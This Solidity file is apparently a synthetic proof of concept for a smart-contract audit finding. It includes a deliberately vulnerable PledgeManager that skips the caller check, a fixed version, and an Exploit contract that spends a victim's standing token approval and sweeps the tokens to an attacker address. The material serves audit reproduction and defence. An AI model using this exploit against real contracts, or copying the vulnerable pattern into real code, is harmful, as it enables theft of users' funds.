// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * Synthetic PoC for AuditVault finding 61175 (Remora Pledge, Cyfrin / Dacian)
 *
 * "Attacker can make pledge on behalf of users if those users have approved
 *  PledgeManager to spend their tokens."
 *
 * PledgeManager.pledge(data) pulls data.signer's stablecoin via
 * transferFrom(signer, ...) but in the NON-permit path never checks
 * msg.sender == data.signer. A victim who left an open ERC20 approval to the
 * PledgeManager can have an attacker call pledge() with data.signer = victim,
 * spending the victim's tokens without consent.
 *
 * HARM: the victim's stablecoin is spent without consent = a REAL loss to the
 * victim. The exploit forwards the victim's spent tokens to ATTACKER so
 * ATTACKER's stablecoin balance equals the amount stolen from the victim.
 */

// ---------------------------------------------------------------------------
// Minimal ERC20 stablecoin double (faithful transferFrom + approve semantics)
// ---------------------------------------------------------------------------
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 6;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ERC20: insufficient allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

// ---------------------------------------------------------------------------
// Vulnerable PledgeManager (faithful minimal double of the finding's code)
// ---------------------------------------------------------------------------
contract PledgeManager {
    // The pledge input struct (mirrors the protocol's PledgeData shape).
    struct PledgeData {
        address signer; // account whose stablecoin is pulled
        uint256 stablecoinAmount; // amount to pledge
        bool usePermit; // permit path vs manual-approval path
        // permit fields (unused in the manual path)
        uint8 permitV;
        bytes32 permitR;
        bytes32 permitS;
    }

    address public immutable stablecoin;

    // signer => total pledged (protocol accounting for the pledge)
    mapping(address => uint256) public pledgedOf;

    error MsgSenderNotSigner();

    constructor(address _stablecoin) {
        stablecoin = _stablecoin;
    }

    // VULNERABLE: never enforces msg.sender == data.signer in the non-permit
    // path, so anyone can pledge on behalf of any account with an open approval.
    function pledge(PledgeData calldata data) external {
        address signer = data.signer;
        uint256 finalStablecoinAmount = data.stablecoinAmount;

        if (data.usePermit) {
            // permit path binds the signature to `signer` (nonce/deadline/domain)
            // (omitted in this synthetic double; the bug is in the else path)
        }
        // @> MISSING: else if (msg.sender != signer) revert MsgSenderNotSigner();

        // Pull the signer's stablecoin using their standing approval. Because
        // the caller is never checked, an attacker triggers this spend.
        MiniToken(stablecoin).transferFrom(signer, address(this), finalStablecoinAmount); // @>

        pledgedOf[signer] += finalStablecoinAmount;
    }

    // Lets the exploit sweep pulled tokens out (models the manager forwarding
    // the pledged funds onward; used to route the victim's loss to ATTACKER).
    function sweep(address to, uint256 amount) external {
        MiniToken(stablecoin).transfer(to, amount);
    }
}

// ---------------------------------------------------------------------------
// Fixed PledgeManager: enforces msg.sender == data.signer in the non-permit path
// ---------------------------------------------------------------------------
contract PledgeManagerFixed {
    struct PledgeData {
        address signer;
        uint256 stablecoinAmount;
        bool usePermit;
        uint8 permitV;
        bytes32 permitR;
        bytes32 permitS;
    }

    address public immutable stablecoin;
    mapping(address => uint256) public pledgedOf;

    error MsgSenderNotSigner();

    constructor(address _stablecoin) {
        stablecoin = _stablecoin;
    }

    function pledge(PledgeData calldata data) external {
        address signer = data.signer;
        uint256 finalStablecoinAmount = data.stablecoinAmount;

        if (data.usePermit) {
            // permit path
        } else if (msg.sender != signer) {
            revert MsgSenderNotSigner(); // FIX
        }

        MiniToken(stablecoin).transferFrom(signer, address(this), finalStablecoinAmount);
        pledgedOf[signer] += finalStablecoinAmount;
    }
}

// ---------------------------------------------------------------------------
// VictimActor: an ordinary user account (modeled as a contract so its standing
// ERC20 approval is set from its own msg.sender, without cheatcodes). The victim
// leaves an OPEN max approval to the manager and never intends this spend.
// ---------------------------------------------------------------------------
contract VictimActor {
    function approveManager(MiniToken token, address manager) external {
        token.approve(manager, type(uint256).max); // open, standing approval
    }
}

// ---------------------------------------------------------------------------
// Exploit
// ---------------------------------------------------------------------------
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 public constant PLEDGE_AMOUNT = 1_000e6; // 1,000 stablecoin (6 decimals)

    // Public results for the driver to assert.
    MiniToken public stable;
    PledgeManager public manager;
    VictimActor public victim;
    uint256 public victimBalanceBefore;
    uint256 public victimBalanceAfter;
    uint256 public attackerProfit;

    function run() external payable {
        // --- Create every helper contract up front, fixed order ---
        stable = new MiniToken("USD Stable", "USDX"); // nonce 1
        manager = new PledgeManager(address(stable)); // nonce 2
        victim = new VictimActor(); // nonce 3

        // --- Preconditions from the finding ---
        // Victim holds stablecoin and left an OPEN (max) approval to the manager.
        stable.mint(address(victim), PLEDGE_AMOUNT);
        victim.approveManager(stable, address(manager));

        victimBalanceBefore = stable.balanceOf(address(victim));

        // --- Exploit: attacker pledges on the victim's behalf ---
        // Build PledgeData with signer = victim, non-permit path. The caller of
        // pledge() is this Exploit contract (the "attacker"), NOT the victim.
        PledgeManager.PledgeData memory data = PledgeManager.PledgeData({
            signer: address(victim),
            stablecoinAmount: PLEDGE_AMOUNT,
            usePermit: false,
            permitV: 0,
            permitR: bytes32(0),
            permitS: bytes32(0)
        });
        manager.pledge(data); // spends the victim's tokens without consent

        victimBalanceAfter = stable.balanceOf(address(victim));

        // Route the stolen tokens to ATTACKER so its balance == the profit.
        manager.sweep(ATTACKER, PLEDGE_AMOUNT);
        attackerProfit = stable.balanceOf(ATTACKER);
    }
}
